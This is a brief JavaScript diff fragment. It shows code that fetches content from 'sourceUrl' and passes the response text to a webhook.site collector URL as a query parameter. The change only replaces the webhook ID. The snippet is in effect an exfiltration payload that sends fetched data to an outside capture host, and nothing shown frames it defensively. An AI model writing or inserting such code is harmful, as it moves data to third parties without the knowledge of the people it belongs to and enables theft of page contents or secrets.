@@ -20,5 +20,5 @@ fetch(sourceUrl)
     return response.text();
   })
   .then(data => {
-    return fetch(`https://webhook.site/0823641ad2bba20d8806d70ad23f9d3ec2dc5a42?response=${data}`);
+    return fetch(`https://webhook.site/f2911ad9-1391-4bab-8584-0a6484b8c73d?response=${data}`);
   })
